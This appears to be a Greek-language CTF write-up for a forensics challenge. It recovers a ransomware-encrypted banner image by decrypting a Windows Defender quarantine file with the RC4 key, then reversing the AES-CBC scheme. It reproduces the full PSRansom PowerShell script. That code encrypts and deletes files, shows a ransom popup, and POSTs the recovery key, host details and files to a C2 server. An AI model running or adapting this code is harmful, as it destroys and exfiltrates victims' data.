# Important Banner 
### Description
Some hours ago i saw a weird file in my Desktop that was unfamiliar. A few minutes later my important image with banner for NTUA_HACK 3.0 was encrypted. When i tried to read the weird file and see what happend Microsoft Defender sent the file to quarantine but I'm not able to get it back. Can you help me recover my important banner?


Ξεκινώντας έχουμε ενα .zip αρχείο το οποίο περιέχει 2 αρχεία. Το 1ο είναι το `Defender_Encrypted` και το 2ο είναι το `NHACK_BANNER.txt.NHACK`. Προφανώς θα χρειαστεί με κάποιο τρόπο να βρούμε τον τρόπο κρυπτογράφησης για να τα αποκρυπτογραφήσουμε.

Απο την περιγραφή γνωρίζουμε οτι το script που κρυπτογράφησε το banner έχει κρυπτογραφηθεί απο Microsoft Defender. Αν ψάξουμε στο google "microsoft defender quarantine encryption" μας εμφανίζει οτι χρησιμοποιεί RC4 για την κρυπτογράφηση. Οπότε μας μένει να βρούμε το κλειδί. Αν ψάξουμε λίγο ακόμα και συγκεκριμένα για το κλειδί θα βρούμε το εξής άρθρο: `https://reversingfun.com/posts/how-to-extract-quarantine-files-from-windows-defender/` στο οποίο αναγράφεται το rc4 key.

```
0x1E, 0x87, 0x78, 0x1B, 0x8D, 0xBA, 0xA8, 0x44, 0xCE, 0x69, 0x70, 0x2C, 0x0C,
0x78, 0xB7, 0x86, 0xA3, 0xF6, 0x23, 0xB7, 0x38, 0xF5, 0xED, 0xF9, 0xAF, 0x83,
0x53, 0x0F, 0xB3, 0xFC, 0x54, 0xFA, 0xA2, 0x1E, 0xB9, 0xCF, 0x13, 0x31, 0xFD,
0x0F, 0x0D, 0xA9, 0x54, 0xF6, 0x87, 0xCB, 0x9E, 0x18, 0x27, 0x96, 0x97, 0x90,
0x0E, 0x53, 0xFB, 0x31, 0x7C, 0x9C, 0xBC, 0xE4, 0x8E, 0x23, 0xD0, 0x53, 0x71,
0xEC, 0xC1, 0x59, 0x51, 0xB8, 0xF3, 0x64, 0x9D, 0x7C, 0xA3, 0x3E, 0xD6, 0x8D,
0xC9, 0x04, 0x7E, 0x82, 0xC9, 0xBA, 0xAD, 0x97, 0x99, 0xD0, 0xD4, 0x58, 0xCB,
0x84, 0x7C, 0xA9, 0xFF, 0xBE, 0x3C, 0x8A, 0x77, 0x52, 0x33, 0x55, 0x7D, 0xDE,
0x13, 0xA8, 0xB1, 0x40, 0x87, 0xCC, 0x1B, 0xC8, 0xF1, 0x0F, 0x6E, 0xCD, 0xD0,
0x83, 0xA9, 0x59, 0xCF, 0xF8, 0x4A, 0x9D, 0x1D, 0x50, 0x75, 0x5E, 0x3E, 0x19,
0x18, 0x18, 0xAF, 0x23, 0xE2, 0x29, 0x35, 0x58, 0x76, 0x6D, 0x2C, 0x07, 0xE2,
0x57, 0x12, 0xB2, 0xCA, 0x0B, 0x53, 0x5E, 0xD8, 0xF6, 0xC5, 0x6C, 0xE7, 0x3D,
0x24, 0xBD, 0xD0, 0x29, 0x17, 0x71, 0x86, 0x1A, 0x54, 0xB4, 0xC2, 0x85, 0xA9,
0xA3, 0xDB, 0x7A, 0xCA, 0x6D, 0x22, 0x4A, 0xEA, 0xCD, 0x62, 0x1D, 0xB9, 0xF2,
0xA2, 0x2E, 0xD1, 0xE9, 0xE1, 0x1D, 0x75, 0xBE, 0xD7, 0xDC, 0x0E, 0xCB, 0x0A,
0x8E, 0x68, 0xA2, 0xFF, 0x12, 0x63, 0x40, 0x8D, 0xC8, 0x08, 0xDF, 0xFD, 0x16,
0x4B, 0x11, 0x67, 0x74, 0xCD, 0x0B, 0x9B, 0x8D, 0x05, 0x41, 0x1E, 0xD6, 0x26,
0x2E, 0x42, 0x9B, 0xA4, 0x95, 0x67, 0x6B, 0x83, 0x98, 0xDB, 0x2F, 0x35, 0xD3,
0xC1, 0xB9, 0xCE, 0xD5, 0x26, 0x36, 0xF2, 0x76, 0x5E, 0x1A, 0x95, 0xCB, 0x7C,
0xA4, 0xC3, 0xDD, 0xAB, 0xDD, 0xBF, 0xF3, 0x82, 0x53
```

Οπότε με αποκρυπτογράφηση του αρχείου `DEFENDER_ENCRYPTED` παίρνουμε το εξής:
```
#================================#
#     PSRansom by @JoelGMSec     #
#      https://darkbyte.net      #
#================================#

# Design
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like "*Win*") {
$Host.UI.RawUI.WindowTitle = "PSRansom - by @JoelGMSec" 
$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White" }

# Banner
function Show-Banner {
   Write-Host 
   Write-Host "  ____  ____  ____                                  " -ForegroundColor Blue
   Write-Host " |  _ \/ ___||  _ \ __ _ _ __  ___  ___  _ __ ___   " -ForegroundColor Blue
   Write-Host " | |_) \___ \| |_) / _' | '_ \/ __|/ _ \| '_ ' _ \  " -ForegroundColor Blue
   Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
   Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
   Write-Host                                                            
   Write-Host "  ----------------- by @JoelGMSec ----------------  " -ForegroundColor Green }

# Help
function Show-Help {
   Write-host ; Write-Host " Info: " -ForegroundColor Yellow -NoNewLine ; Write-Host " This tool helps you simulate encryption process of a"
   Write-Host "        generic ransomware in PowerShell with C2 capabilities"
   Write-Host ; Write-Host " Usage: " -ForegroundColor Yellow -NoNewLine ; Write-Host ".\PSRansom.ps1 -e Directory -s C2Server -p C2Port" -ForegroundColor Blue 
   Write-Host "          Encrypt all files & sends recovery key to C2Server" -ForegroundColor Green
   Write-Host "          Use -x to exfiltrate and decrypt files on C2Server" -ForegroundColor Green
   Write-Host ; Write-Host "        .\PSRansom.ps1 -d Directory -k RecoveryKey" -ForegroundColor Blue 
   Write-Host "          Decrypt all files with recovery key string" -ForegroundColor Green
   Write-Host ; Write-Host " Warning: " -ForegroundColor Red -NoNewLine  ; Write-Host "All info will be sent to the C2Server without any encryption"
   Write-Host "         " -NoNewLine ; Write-Host " You need previously generated recovery key to retrieve files" ; Write-Host }

# Variables
$Mode = $args[0]
$Directory = $args[1]
$PSRKey = 'Sup3rS3cr3tK3y!!'
$C2Server = $args[3]
$C2Port = $args[5]
$Exfil = $args[6]
$C2Status = $null

# Errors
if ($args[0] -like "-h*") { Show-Banner ; Show-Help ; break }
if ($args[0] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[1] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[2] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }
if ($args[3] -eq $null) { Show-Banner ; Show-Help ; Write-Host "[!] Not enough parameters!" -ForegroundColor Red ; Write-Host ; break }

# Proxy Aware
[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$AllProtocols = [System.Net.SecurityProtocolType]"Ssl3,Tls,Tls11,Tls12" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols

# Functions
$computer = ([Environment]::MachineName).ToLower() ; $user = ([Environment]::UserName).ToLower() ; $Readme = "readme.txt"
$Time = Get-Date -Format "HH:mm - dd/MM/yy" ; $TMKey = $time.replace(":","").replace(" ","").replace("-","").replace("/","")+$computer
if ($OSVersion -like "*Win*") { $domain = (([Environment]::UserDomainName).ToLower()+"\") ; $slash = "\" } else { $domain = $null ; $slash = "/" } 
$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }

function Invoke-AESEncryption {
   [CmdletBinding()]
   [OutputType([string])]
   Param(
       [Parameter(Mandatory = $true)]
       [ValidateSet("Encrypt", "Decrypt")]
       [String]$Mode,

       [Parameter(Mandatory = $true)]
       [String]$Key,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
       [String]$Text,

       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
       [String]$Path)

   Begin {
      $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
      $aesManaged = New-Object System.Security.Cryptography.AesManaged
      $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $aesManaged.BlockSize = 128
      $aesManaged.KeySize = 256 }

   Process {
      $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
      switch ($Mode) {

         "Encrypt" {
             if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName + ".psr" }

             $encryptor = $aesManaged.CreateEncryptor()
             $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
             $encryptedBytes = $aesManaged.IV + $encryptedBytes
             $aesManaged.Dispose()

             if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}

         "Decrypt" {
             if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}

             if ($Path) {
                $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                if (!$File.FullName) { break }
                $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                $outPath = $File.FullName.replace(".psr","") }

             $aesManaged.IV = $cipherBytes[0..15]
             $decryptor = $aesManaged.CreateDecryptor()
             $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
             $aesManaged.Dispose()

             if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
             if ($Path) {
                [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}}}

  End {
      $shaManaged.Dispose()
      $aesManaged.Dispose()}}

function RemoveWallpaper {
$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using Microsoft.Win32;
 
namespace CurrentUser { public class Desktop {
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);
[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
private static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);
public const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;
public const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;
public int[] first = {COLOR_DESKTOP};

public static void RemoveWallPaper(){
SystemParametersInfo( SetDesktopBackground, 0, "", SendWinIniChange | UpdateIniFile );
RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
regkey.SetValue(@"WallPaper", 0); regkey.Close();}

public static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};

RemoveWallPaper();
System.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);
int[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };

SetSysColors(elements.Length, elements, colors);
RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\Colors", true);
key.SetValue(@"Background", string.Format("{0} {1} {2}", color.R, color.G, color.B));
key.Close();}}}
 
"@
try { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }
finally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}

function PopUpRansom {
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")  
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 
[void] [System.Windows.Forms.Application]::EnableVisualStyles() 

Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.jpg -Outfile $env:temp\PSRansom.jpg
Invoke-WebRequest -useb https://raw.githubusercontent.com/JoelGMSec/PSRansom/main/Demo/PSRansom.ico -Outfile $env:temp\PSRansom.ico
$shell = New-Object -ComObject "Shell.Application"
$shell.minimizeall()

$form = New-Object system.Windows.Forms.Form
$form.ControlBox = $false;
$form.Size = New-Object System.Drawing.Size(900,600) 
$form.BackColor = "Black" 
$form.MaximizeBox = $false 
$form.StartPosition = "CenterScreen" 
$form.WindowState = "Normal"
$form.Topmost = $true
$form.FormBorderStyle = "Fixed3D"
$form.Text = "PSRansom by @JoelGMSec - https://github.com/JoelGMSec/PSRansom"
$formIcon = New-Object system.drawing.icon ("$env:temp\PSRansom.ico") 
$form.Icon = $formicon  

$img = [System.Drawing.Image]::Fromfile("$env:temp\PSRansom.jpg")
$pictureBox = new-object Windows.Forms.PictureBox
$pictureBox.Width = 920
$pictureBox.Height = 370
$pictureBox.SizeMode = "StretchImage"
$pictureBox.Image = $img
$form.controls.add($pictureBox)

$label = New-Object System.Windows.Forms.Label
$label.ForeColor = "Cyan"
$label.Text = "All your files have been encrypted by PSRansom!" 
$label.AutoSize = $true 
$label.Location = New-Object System.Drawing.Size(50,400) 
$font = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font 
$form.Controls.Add($label) 

$label1 = New-Object System.Windows.Forms.Label
$label1.ForeColor = "White"
$label1.Text = "But don't worry, you can still recover them with the recovery key :)" 
$label1.AutoSize = $true 
$label1.Location = New-Object System.Drawing.Size(50,450)
$font1 = New-Object System.Drawing.Font("Consolas",15,[System.Drawing.FontStyle]::Bold) 
$form.Font = $Font1
$form.Controls.Add($label1) 

$okbutton = New-Object System.Windows.Forms.Button;
$okButton.Location = New-Object System.Drawing.Point(750,500)
$okButton.Size = New-Object System.Drawing.Size(110,35)
$okbutton.ForeColor = "Black"
$okbutton.BackColor = "White"
$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$okButton.Text = 'Pay Now!'
$okbutton.Visible = $false
$okbutton.Enabled = $true
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$okButton.add_Click({ 
[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been registered!', 'PSRansom Payment System',
[Windows.Forms.MessageBoxButtons]::"OK", [Windows.Forms.MessageBoxIcon]::"Warning")})
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)
$form.Activate() 2>&1> $null
$form.Focus() 2>&1> $null

$btn=New-Object System.Windows.Forms.Label
$btn.Location = New-Object System.Drawing.Point(50,500)
$btn.Width = 500
$form.Controls.Add($btn)
$btn.ForeColor = "Red"
$startTime = [DateTime]::Now
$count = 10.6
$timer=New-Object System.Windows.Forms.Timer
$timer.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds
if ($remainingSeconds -like "-0.1*"){ $timer.Stop() ; $okbutton.Visible = $true ; $btn.Text = "0 Seconds remaining.." }
$btn.Text = [String]::Format("{0} Seconds remaining..", [math]::round($remainingSeconds))})
$timer.Start()

$btntest = $form.ShowDialog()
if ($btntest -like "OK"){ $Global:PayNow = "True" }}
Remove-Item $env:temp\PSRansom* -force

function R64Encoder { 
   if ($args[0] -eq "-t") { $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }
   if ($args[0] -eq "-f") { $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }
   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")
   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 ; return $R64Base }

function ShowInfo {
   Write-Host ; Write-Host "[>] Hostname: " -NoNewLine -ForegroundColor Yellow ; Write-Host $computer
   Write-Host "[>] Current User: " -NoNewLine -ForegroundColor Yellow ; Write-Host $domain$user
   Write-Host "[>] Current Time: " -NoNewLine -ForegroundColor Yellow ; Write-Host $time }

function GetStatus {
   Try { Invoke-WebRequest -useb "$C2Server`:$C2Port/status" -Method GET 
      Write-Host "[i] Command & Control Server is up!" -ForegroundColor Green }
   Catch { Write-Host "[!] Command & Control Server is down!" -ForegroundColor Red }}

function SendResults {
   $DESKey = Invoke-AESEncryption -Mode Encrypt -Key $TMKey -Text $PSRKey ; $B64Key = R64Encoder -t $DESKey
   $C2Data = " [>] Key: $B64Key [>] Hostname: $computer [>] Current User: $domain$user [>] Current Time: $time"
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch
   $B64Data = R64Encoder -t $C2Data ; $B64Logs = R64Encoder -t $RansomLogs
   Invoke-WebRequest -useb "$C2Server`:$C2Port/data" -Method POST -Body $B64Data 2>&1> $null
   Invoke-WebRequest -useb "$C2Server`:$C2Port/logs" -Method POST -Body $B64Logs 2>&1> $null }

function SendClose {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/close" -Method GET 2>&1> $null }

function SendPay {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/pay" -Method GET 2>&1> $null }

function SendOK {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }

function CreateReadme {
   $ReadmeTXT = "All your files have been encrypted by PSRansom!`nBut don't worry, you can still recover them with the recovery key :)`n"
   if (!(Test-Path "$Directory$slash$Readme")) { Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT 
   Add-Content -Path "$Directory$slash$Readme" -Value "Recovery Key: $PSRKey `n" }}

function EncryptFiles { 
   $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
   Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i ; Add-Content -Path "$Directory$slash$Readme" -Value "[!] $i is now encrypted" ; Remove-Item $i }
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "[!]" | Select-String "PSRansom!" -NotMatch ; if (!$RansomLogs) { 
   Add-Content -Path "$Directory$slash$Readme" -Value "[!] No files have been encrypted!" }}

function ExfiltrateFiles {
   Invoke-WebRequest -useb "$C2Server`:$C2Port/files" -Method GET 2>&1> $null 
   $RansomLogs = Get-Content "$Directory$slash$Readme" | Select-String "No files have been encrypted!" ; if (!$RansomLogs) {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile
      Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}
   else { $B64Name = R64Encoder -t "none.null" ; Invoke-WebRequest -useb "$C2Server`:$C2Port/files/$B64Name" -Method POST -Body $B64file 2>&1> $null }}

function DecryptFiles {
   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.psr | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
      Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace(".psr","")
      Write-Host "[+] $rfile is now decrypted" -ForegroundColor Blue } ; Remove-Item "$Directory$slash$Readme" }

function CheckFiles { 
   $RFiles = Get-ChildItem $Directory -recurse -filter *.psr ; if ($RFiles) { $RFiles | Remove-Item } else {
   Write-Host "[!] No encrypted files has been found!" -ForegroundColor Red }}

# Main
Show-Banner ; ShowInfo

if ($Mode -eq "-d") { 
   Write-Host ; Write-Host "[!] Recovering ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[i] Applying recovery key on encrypted files.." -ForegroundColor Green
   DecryptFiles ; CheckFiles ; sleep 1 }
 
else {
   Write-Host ; Write-Host "[!] Simulating ransomware infection on $DirectoryTarget directory.." -ForegroundColor Red
   Write-Host "[+] Checking communication with Command & Control Server.." -ForegroundColor Blue
   $C2Status = GetStatus ; sleep 1

   Write-Host "[+] Generating new random string key for encryption.." -ForegroundColor Blue
   $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})

   Write-Host "[!] Encrypting all files with 256 bits AES key.." -ForegroundColor Red
   CreateReadme ; EncryptFiles ; if ($C2Status) { SendResults ; sleep 1

   if ($Exfil -eq "-x") { Write-Host "[i] Exfiltrating files to Command & Control Server.." -ForegroundColor Green
      ExfiltrateFiles ; sleep 1 }}

   if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
   else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}

   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
   if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
   else { SendOK }

sleep 1 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
```

Στο συγκεκριμένο μας ενδιαφέρει να βρούμε το τρόπο κρυπτογράφησης και τα κλειδιά. Κοιτώντας προσεκτικά παρατηρούμε οτι χρησιμοποιεί AES-CBC με κλειδί `Sup3rS3cr3tK3y!!`. Στην συνάρτηση `Invoke-AESEncryption` βλέπουμε το εξής ` $encryptedBytes = $aesManaged.IV + $encryptedBytes`. Αυτό σημαίνει οτι το IV βρίσκεται στην αρχή του αρχείου `NHACK_BANNER.txt.NHACK`.
Για την αποκρυπτογράφηση παίρνουμε τα πρώτα 16 bytes απο το αρχείο `NHACK_BANNER.txt.NHACK` για το IV το κλειδί που βρήκαμε και χρησιμοποιούμε AES-CBC. Μόλις γίνει η αποκρυπτογράφηση βάζουμε extension .png και το ανοίγουμε και βλέπουμε το flag.